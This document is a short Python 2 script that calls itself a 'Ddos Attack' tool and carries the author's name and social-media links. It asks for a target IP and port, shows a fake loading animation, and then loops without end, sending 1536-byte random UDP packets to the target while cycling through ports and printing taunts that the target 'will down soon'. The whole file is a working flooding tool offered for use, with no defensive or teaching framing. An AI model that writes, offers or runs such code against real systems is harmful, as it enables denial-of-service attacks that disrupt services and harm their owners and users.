import os 
import sys
import socket
import time
import random
from datetime import datetime
now=datetime.now()
hour=now.hour
minute=now.minute
day=now.day
month=now.month
year=now.year

#####
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1536)
#####
os.system("clear")
os.system("figlet Ddos Attack")
os.system("ifconfig -s eth0")
print "                                                                    "
print "Pen Name  : Nasaboy007"
print "Author    : Sumanth_Kommineni"
print "Github    : https://github.com/nasaboy007"
print "Facebook  : https://www.facebook.com/sunnydj11"
print "Youtube   : https://www.youtube.com/channel/UCI1cvucuqw4du4y-KbF_8cw"
print "                                                                    "
ip = raw_input("Target IP: ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Started...")
print " Loading 0%..."
time.sleep(2)
print " Loading 25%....."
time.sleep(2)
print " Loading 50%........"
time.sleep(2)
print " Loading 75%..........."
time.sleep(2)
print " Loading 100%............."
time.sleep(2)
os.system("figlet Boom ..")
time.sleep(1)
sent = 0
while True:
	sock.sendto(bytes,(ip,port))
	sent = sent + 1
	port = port + 1
	print "sent %s packet to %s throught port:%s"%(sent,ip,port)
	print "HaHaHa Will down soon...!!!"
	if port == 65534:
	   port = 1